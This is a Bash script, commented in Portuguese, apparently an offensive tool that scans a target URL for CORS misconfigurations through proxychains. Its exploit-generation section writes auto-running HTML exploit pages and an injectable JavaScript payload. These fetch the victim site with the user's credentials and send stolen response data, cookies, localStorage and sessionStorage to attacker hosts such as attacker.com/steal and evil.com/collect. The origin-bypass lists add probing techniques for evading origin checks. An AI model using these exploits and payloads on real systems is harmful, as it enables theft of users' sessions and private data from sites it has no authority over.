#!/bin/bash
# CORS SUPER TESTER - Ferramenta definitiva para CORS
echo "=== CORS SUPER TESTER - ULTIMATE CORS TOOL ==="

TARGET="$1"
MODE="${2:-full}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL> [MODE]"
    echo "Modos: basic, advanced, exploit, full"
    echo "Exemplo: $0 https://api.example.com full"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/cors_super_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/cors.log" ;;
        "VULN") echo "⚠️  [$timestamp] $msg" | tee -a "$TEMP_DIR/cors.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/cors.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/cors.log" ;;
    esac
}

# Teste básico de CORS
cors_basic_test() {
    log "INFO" "Iniciando teste básico de CORS"
    
    # Teste simples com Origin
    local response=$(proxychains4 -q curl -s -I -H "Origin: https://evil.com" "$TARGET" --connect-timeout 15 2>/dev/null)
    
    if [ -n "$response" ]; then
        log "INFO" "Resposta obtida para teste básico"
        echo "$response" > "$TEMP_DIR/basic_cors_response.txt"
        
        # Verificar headers CORS
        local acao=$(echo "$response" | grep -i "access-control-allow-origin" | cut -d: -f2- | tr -d ' \r')
        local acac=$(echo "$response" | grep -i "access-control-allow-credentials" | cut -d: -f2- | tr -d ' \r')
        local acam=$(echo "$response" | grep -i "access-control-allow-methods" | cut -d: -f2- | tr -d ' \r')
        local acah=$(echo "$response" | grep -i "access-control-allow-headers" | cut -d: -f2- | tr -d ' \r')
        
        if [ -n "$acao" ]; then
            log "SUCCESS" "Access-Control-Allow-Origin: $acao"
            echo "ACAO:$acao" >> "$TEMP_DIR/cors_headers.txt"
            
            # Verificar se permite qualquer origem
            if [ "$acao" = "*" ]; then
                log "VULN" "CORS permite qualquer origem (*)"
                echo "WILDCARD_ORIGIN" >> "$TEMP_DIR/vulnerabilities.txt"
            elif echo "$acao" | grep -q "evil.com"; then
                log "CRITICAL" "CORS reflete origem maliciosa!"
                echo "REFLECTED_ORIGIN" >> "$TEMP_DIR/vulnerabilities.txt"
            fi
        fi
        
        if [ -n "$acac" ]; then
            log "INFO" "Access-Control-Allow-Credentials: $acac"
            echo "ACAC:$acac" >> "$TEMP_DIR/cors_headers.txt"
            
            if [ "$acac" = "true" ] && [ "$acao" = "*" ]; then
                log "CRITICAL" "CORS CRÍTICO: Wildcard + Credentials!"
                echo "WILDCARD_WITH_CREDENTIALS" >> "$TEMP_DIR/vulnerabilities.txt"
            fi
        fi
        
        if [ -n "$acam" ]; then
            log "INFO" "Access-Control-Allow-Methods: $acam"
            echo "ACAM:$acam" >> "$TEMP_DIR/cors_headers.txt"
        fi
        
        if [ -n "$acah" ]; then
            log "INFO" "Access-Control-Allow-Headers: $acah"
            echo "ACAH:$acah" >> "$TEMP_DIR/cors_headers.txt"
        fi
    else
        log "INFO" "Nenhuma resposta obtida para teste básico"
    fi
}

# Teste avançado de CORS
cors_advanced_test() {
    log "INFO" "Iniciando teste avançado de CORS"
    
    # Lista de origens maliciosas para teste
    local malicious_origins=(
        "https://evil.com"
        "http://evil.com"
        "https://attacker.com"
        "http://attacker.com"
        "null"
        "file://"
        "data:"
        "javascript:"
        "vbscript:"
        "about:blank"
        "chrome-extension://fake"
        "moz-extension://fake"
        "safari-extension://fake"
    )
    
    # Extrair domínio do target para testes de bypass
    local target_domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    
    # Adicionar variações do domínio alvo
    local domain_variations=(
        "https://$target_domain.evil.com"
        "https://evil.$target_domain"
        "https://$target_domain-evil.com"
        "https://evil-$target_domain.com"
        "https://${target_domain}evil.com"
        "https://evil${target_domain}.com"
        "https://sub.$target_domain"
        "https://www.$target_domain"
        "https://api.$target_domain"
        "https://admin.$target_domain"
    )
    
    # Combinar todas as origens
    local all_origins=("${malicious_origins[@]}" "${domain_variations[@]}")
    
    log "INFO" "Testando $(( ${#all_origins[@]} )) origens diferentes"
    
    for origin in "${all_origins[@]}"; do
        log "INFO" "Testando origem: $origin"
        
        # Teste com GET
        local get_response=$(proxychains4 -q curl -s -I -H "Origin: $origin" "$TARGET" --connect-timeout 10 2>/dev/null)
        
        if [ -n "$get_response" ]; then
            local acao=$(echo "$get_response" | grep -i "access-control-allow-origin" | cut -d: -f2- | tr -d ' \r')
            local acac=$(echo "$get_response" | grep -i "access-control-allow-credentials" | cut -d: -f2- | tr -d ' \r')
            
            if [ -n "$acao" ]; then
                echo "GET:$origin:$acao:$acac" >> "$TEMP_DIR/cors_test_results.txt"
                
                # Verificar se a origem foi aceita
                if [ "$acao" = "$origin" ] || [ "$acao" = "*" ]; then
                    log "VULN" "Origem aceita: $origin -> $acao"
                    echo "ACCEPTED:$origin:$acao" >> "$TEMP_DIR/accepted_origins.txt"
                    
                    # Se credentials também estão habilitadas
                    if [ "$acac" = "true" ]; then
                        log "CRITICAL" "CORS CRÍTICO: $origin com credentials!"
                        echo "CRITICAL:$origin:$acao:$acac" >> "$TEMP_DIR/critical_cors.txt"
                    fi
                fi
            fi
        fi
        
        # Teste com OPTIONS (preflight)
        local options_response=$(proxychains4 -q curl -s -I -X OPTIONS \
            -H "Origin: $origin" \
            -H "Access-Control-Request-Method: POST" \
            -H "Access-Control-Request-Headers: Content-Type,Authorization" \
            "$TARGET" --connect-timeout 10 2>/dev/null)
        
        if [ -n "$options_response" ]; then
            local options_acao=$(echo "$options_response" | grep -i "access-control-allow-origin" | cut -d: -f2- | tr -d ' \r')
            local options_acac=$(echo "$options_response" | grep -i "access-control-allow-credentials" | cut -d: -f2- | tr -d ' \r')
            local acam=$(echo "$options_response" | grep -i "access-control-allow-methods" | cut -d: -f2- | tr -d ' \r')
            local acah=$(echo "$options_response" | grep -i "access-control-allow-headers" | cut -d: -f2- | tr -d ' \r')
            
            if [ -n "$options_acao" ]; then
                echo "OPTIONS:$origin:$options_acao:$options_acac:$acam:$acah" >> "$TEMP_DIR/cors_preflight_results.txt"
                
                if [ "$options_acao" = "$origin" ] || [ "$options_acao" = "*" ]; then
                    log "VULN" "Preflight aceito: $origin -> $options_acao"
                    echo "PREFLIGHT_ACCEPTED:$origin:$options_acao" >> "$TEMP_DIR/accepted_preflights.txt"
                fi
            fi
        fi
        
        sleep 1  # Evitar rate limiting
    done
}

# Teste de bypass de CORS
cors_bypass_test() {
    log "INFO" "Iniciando testes de bypass de CORS"
    
    local target_domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    
    # Técnicas de bypass
    local bypass_origins=(
        # Null origin
        "null"
        
        # Subdomain bypass
        "https://evil.$target_domain"
        "https://$target_domain.evil.com"
        "https://sub.$target_domain"
        
        # Protocol bypass
        "http://$target_domain"
        "https://$target_domain"
        
        # Port bypass
        "https://$target_domain:8080"
        "https://$target_domain:443"
        "https://$target_domain:80"
        
        # Case bypass
        "HTTPS://$target_domain"
        "https://$(echo $target_domain | tr '[:lower:]' '[:upper:]')"
        
        # Unicode bypass
        "https://$target_domain\u002e"
        "https://$target_domain\u0000"
        
        # IP bypass (se possível resolver)
        # "https://127.0.0.1"
        # "https://localhost"
        
        # Data URI bypass
        "data:text/html,<script>alert(1)</script>"
        
        # File protocol bypass
        "file://"
        "file:///etc/passwd"
        
        # Chrome extension bypass
        "chrome-extension://fake-extension-id"
        "moz-extension://fake-extension-id"
        
        # About blank bypass
        "about:blank"
        
        # JavaScript protocol bypass
        "javascript:alert(1)"
        
        # Vbscript bypass
        "vbscript:msgbox(1)"
    )
    
    log "INFO" "Testando $(( ${#bypass_origins[@]} )) técnicas de bypass"
    
    for bypass_origin in "${bypass_origins[@]}"; do
        log "INFO" "Testando bypass: $bypass_origin"
        
        local bypass_response=$(proxychains4 -q curl -s -I -H "Origin: $bypass_origin" "$TARGET" --connect-timeout 10 2>/dev/null)
        
        if [ -n "$bypass_response" ]; then
            local acao=$(echo "$bypass_response" | grep -i "access-control-allow-origin" | cut -d: -f2- | tr -d ' \r')
            local acac=$(echo "$bypass_response" | grep -i "access-control-allow-credentials" | cut -d: -f2- | tr -d ' \r')
            
            if [ -n "$acao" ]; then
                echo "BYPASS:$bypass_origin:$acao:$acac" >> "$TEMP_DIR/cors_bypass_results.txt"
                
                # Verificar se o bypass funcionou
                if [ "$acao" = "$bypass_origin" ] || [ "$acao" = "*" ]; then
                    log "CRITICAL" "BYPASS FUNCIONOU: $bypass_origin -> $acao"
                    echo "BYPASS_SUCCESS:$bypass_origin:$acao:$acac" >> "$TEMP_DIR/successful_bypasses.txt"
                    
                    # Testar se pode fazer requisições autenticadas
                    if [ "$acac" = "true" ]; then
                        log "CRITICAL" "BYPASS COM CREDENTIALS: $bypass_origin"
                        echo "BYPASS_WITH_CREDS:$bypass_origin" >> "$TEMP_DIR/critical_bypasses.txt"
                    fi
                fi
            fi
        fi
        
        sleep 1
    done
}

# Geração de exploits CORS
cors_exploit_generation() {
    log "INFO" "Gerando exploits CORS"
    
    # Verificar se temos vulnerabilidades para explorar
    if [ -f "$TEMP_DIR/critical_cors.txt" ] || [ -f "$TEMP_DIR/successful_bypasses.txt" ]; then
        log "INFO" "Gerando exploits baseados nas vulnerabilidades encontradas"
        
        # Exploit básico para CORS com wildcard
        if grep -q "WILDCARD" "$TEMP_DIR/vulnerabilities.txt" 2>/dev/null; then
            log "INFO" "Gerando exploit para CORS wildcard"
            
            cat > "$TEMP_DIR/cors_wildcard_exploit.html" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CORS Wildcard Exploit</title>
</head>
<body>
    <h1>CORS Wildcard Exploit</h1>
    <div id="result"></div>
    
    <script>
        // Exploit para CORS com wildcard (*)
        function exploitWildcard() {
            fetch('$TARGET', {
                method: 'GET',
                credentials: 'include'  // Incluir cookies
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerHTML = '<h2>Dados obtidos:</h2><pre>' + data + '</pre>';
                
                // Enviar dados para servidor do atacante
                fetch('https://attacker.com/steal', {
                    method: 'POST',
                    body: JSON.stringify({
                        url: '$TARGET',
                        data: data,
                        cookies: document.cookie
                    }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
            })
            .catch(error => {
                console.error('Erro:', error);
                document.getElementById('result').innerHTML = 'Erro: ' + error;
            });
        }
        
        // Executar exploit automaticamente
        window.onload = exploitWildcard;
    </script>
</body>
</html>
EOF
            log "SUCCESS" "Exploit wildcard gerado: cors_wildcard_exploit.html"
        fi
        
        # Exploit para origens específicas aceitas
        if [ -f "$TEMP_DIR/accepted_origins.txt" ]; then
            while IFS=: read -r type origin acao acac; do
                if [ "$type" = "ACCEPTED" ]; then
                    log "INFO" "Gerando exploit para origem aceita: $origin"
                    
                    local exploit_file="$TEMP_DIR/cors_exploit_$(echo $origin | tr '/:.' '_').html"
                    
                    cat > "$exploit_file" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - $origin</title>
</head>
<body>
    <h1>CORS Exploit para $origin</h1>
    <div id="result"></div>
    
    <script>
        // Exploit para origem específica: $origin
        function exploitCORS() {
            fetch('$TARGET', {
                method: 'GET',
                credentials: '$( [ "$acac" = "true" ] && echo "include" || echo "omit" )'
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerHTML = '<h2>Dados obtidos de $TARGET:</h2><pre>' + data + '</pre>';
                
                // Exfiltrar dados
                fetch('https://attacker.com/exfil', {
                    method: 'POST',
                    body: JSON.stringify({
                        target: '$TARGET',
                        origin: '$origin',
                        data: data,
                        cookies: document.cookie,
                        timestamp: new Date().toISOString()
                    }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
            })
            .catch(error => {
                console.error('Erro no exploit:', error);
            });
        }
        
        // Executar quando a página carregar
        window.onload = exploitCORS;
    </script>
</body>
</html>
EOF
                    log "SUCCESS" "Exploit gerado: $(basename $exploit_file)"
                fi
            done < "$TEMP_DIR/accepted_origins.txt"
        fi
        
        # Exploit para bypass bem-sucedidos
        if [ -f "$TEMP_DIR/successful_bypasses.txt" ]; then
            while IFS=: read -r type bypass_origin acao acac; do
                if [ "$type" = "BYPASS_SUCCESS" ]; then
                    log "INFO" "Gerando exploit para bypass: $bypass_origin"
                    
                    local bypass_exploit_file="$TEMP_DIR/cors_bypass_exploit_$(echo $bypass_origin | tr '/:.' '_').html"
                    
                    cat > "$bypass_exploit_file" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CORS Bypass Exploit - $bypass_origin</title>
</head>
<body>
    <h1>CORS Bypass Exploit</h1>
    <p>Bypass Origin: <code>$bypass_origin</code></p>
    <div id="result"></div>
    
    <script>
        // Exploit usando bypass CORS
        function exploitBypass() {
            // Configurar origem no cabeçalho (simulado)
            console.log('Usando origem de bypass: $bypass_origin');
            
            fetch('$TARGET', {
                method: 'GET',
                credentials: '$( [ "$acac" = "true" ] && echo "include" || echo "omit" )',
                headers: {
                    'Origin': '$bypass_origin'
                }
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerHTML = 
                    '<h2>Bypass bem-sucedido!</h2>' +
                    '<p>Origem: $bypass_origin</p>' +
                    '<p>Target: $TARGET</p>' +
                    '<h3>Dados obtidos:</h3>' +
                    '<pre>' + data + '</pre>';
                
                // Exfiltrar via bypass
                fetch('https://evil.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({
                        bypass_method: '$bypass_origin',
                        target: '$TARGET',
                        stolen_data: data,
                        user_agent: navigator.userAgent,
                        timestamp: Date.now()
                    })
                });
            })
            .catch(error => {
                document.getElementById('result').innerHTML = 'Erro no bypass: ' + error;
            });
        }
        
        window.onload = exploitBypass;
    </script>
</body>
</html>
EOF
                    log "SUCCESS" "Exploit de bypass gerado: $(basename $bypass_exploit_file)"
                fi
            done < "$TEMP_DIR/successful_bypasses.txt"
        fi
        
        # Gerar payload JavaScript para injeção
        cat > "$TEMP_DIR/cors_payload.js" <<EOF
// CORS Exploit Payload
// Para ser injetado em páginas vulneráveis

(function() {
    // Função para roubar dados via CORS
    function stealData(targetUrl) {
        fetch(targetUrl, {
            method: 'GET',
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            // Exfiltrar dados
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify({
                    url: targetUrl,
                    data: data,
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage)
                }),
                headers: {'Content-Type': 'application/json'}
            });
        })
        .catch(e => console.log('CORS blocked or error:', e));
    }
    
    // Tentar roubar dados do target
    stealData('$TARGET');
    
    // Tentar outros endpoints comuns
    const commonEndpoints = [
        '$TARGET/api/user',
        '$TARGET/api/profile',
        '$TARGET/api/admin',
        '$TARGET/user/profile',
        '$TARGET/admin/config'
    ];
    
    commonEndpoints.forEach(endpoint => {
        setTimeout(() => stealData(endpoint), Math.random() * 5000);
    });
})();
EOF
        log "SUCCESS" "Payload JavaScript gerado: cors_payload.js"
    fi
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/CORS_SUPER_REPORT.md"
    
    cat > "$report_file" <<EOF
# CORS SUPER TESTER - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Contar descobertas
    local vulns_count=0
    local accepted_origins=0
    local bypasses_count=0
    local exploits_count=0
    
    [ -f "$TEMP_DIR/vulnerabilities.txt" ] && vulns_count=$(wc -l < "$TEMP_DIR/vulnerabilities.txt")
    [ -f "$TEMP_DIR/accepted_origins.txt" ] && accepted_origins=$(wc -l < "$TEMP_DIR/accepted_origins.txt")
    [ -f "$TEMP_DIR/successful_bypasses.txt" ] && bypasses_count=$(wc -l < "$TEMP_DIR/successful_bypasses.txt")
    exploits_count=$(ls "$TEMP_DIR"/*.html 2>/dev/null | wc -l)
    
    echo "- **Vulnerabilidades CORS:** $vulns_count" >> "$report_file"
    echo "- **Origens aceitas:** $accepted_origins" >> "$report_file"
    echo "- **Bypasses bem-sucedidos:** $bypasses_count" >> "$report_file"
    echo "- **Exploits gerados:** $exploits_count" >> "$report_file"
    
    # Adicionar detalhes das vulnerabilidades
    if [ $vulns_count -gt 0 ]; then
        echo -e "\n## ⚠️ VULNERABILIDADES CORS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/vulnerabilities.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    # Adicionar origens aceitas
    if [ $accepted_origins -gt 0 ]; then
        echo -e "\n## 🎯 ORIGENS ACEITAS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/accepted_origins.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    # Adicionar bypasses
    if [ $bypasses_count -gt 0 ]; then
        echo -e "\n## 🔓 BYPASSES BEM-SUCEDIDOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/successful_bypasses.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    # Listar exploits gerados
    if [ $exploits_count -gt 0 ]; then
        echo -e "\n## 💥 EXPLOITS GERADOS" >> "$report_file"
        ls "$TEMP_DIR"/*.html 2>/dev/null | while read exploit_file; do
            echo "- $(basename "$exploit_file")" >> "$report_file"
        done
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "⚠️  Vulnerabilidades: $vulns_count"
    echo "🎯 Origens aceitas: $accepted_origins"
    echo "🔓 Bypasses: $bypasses_count"
    echo "💥 Exploits: $exploits_count"
    
    if [ $vulns_count -gt 0 ] || [ $bypasses_count -gt 0 ]; then
        echo -e "\n🔥 CORS VULNERÁVEL!"
    fi
}

# Execução principal baseada no modo
case "$MODE" in
    "basic")
        cors_basic_test
        ;;
    "advanced")
        cors_basic_test
        cors_advanced_test
        ;;
    "exploit")
        cors_basic_test
        cors_advanced_test
        cors_exploit_generation
        ;;
    "full")
        cors_basic_test
        cors_advanced_test
        cors_bypass_test
        cors_exploit_generation
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ CORS SUPER TESTER CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"